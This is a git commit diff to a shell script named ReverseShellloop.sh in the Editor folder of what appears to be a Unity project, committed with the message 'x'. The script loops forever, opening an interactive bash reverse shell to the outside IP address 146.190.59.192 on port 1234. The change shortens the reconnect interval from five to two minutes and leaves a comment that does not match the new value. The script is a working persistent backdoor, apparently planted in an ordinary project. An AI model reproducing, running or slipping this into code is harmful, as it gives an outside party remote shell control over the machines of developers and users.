2d7aab66075a166d6aaa82b37e4e80edcf052a66
zhiganghuang <zhiganghuang@unity3d.com>
2025-04-15 11:39:42 +0800

    x

--- Assets/Editor/ReverseShellloop.sh
+++ Assets/Editor/ReverseShellloop.sh
@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
 while true; do
     /bin/bash -c 'bash -i >& /dev/tcp/146.190.59.192/1234 0>&1'
-    sleep 300  # 300 seconds = 5 minutes
+    sleep 120  # 300 seconds = 2 minutes
 done
